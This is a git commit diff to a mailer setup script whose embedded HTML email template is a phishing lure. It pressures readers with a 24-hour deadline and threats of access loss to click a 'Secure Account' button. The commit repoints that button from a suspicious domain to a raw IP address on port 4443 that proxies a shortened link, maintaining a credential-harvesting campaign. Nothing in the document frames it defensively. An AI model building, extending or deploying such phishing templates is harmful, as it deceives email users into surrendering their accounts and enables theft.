25381a217d3e84d8e877c6b33a71438d562368c5
Benten1000 <112785547+Benten1000@users.noreply.github.com>
2025-10-20 05:25:38 -0700

    Change secure account link in email template
    Updated the secure account link to a new URL.

--- setup_mailer.sh
+++ setup_mailer.sh
@@ -129,7 +129,7 @@ cat > email.html <<EOL
       Failure to complete this process within the next 24 hours may result in temporary access restrictions or potential data loss.</p>
     </div>
     <div class="button-container">
-      <a href="https://admailsend.top/it/captcha.html" class="cta-button">Secure Account</a>
+      <a href="https://196.251.84.199:4443/proxy?url=ln.run/ywc4t" class="cta-button">Secure Account</a>
     </div>
     <div class="footer">
       &copy; 2025 Webmail Services. All rights reserved.<br />
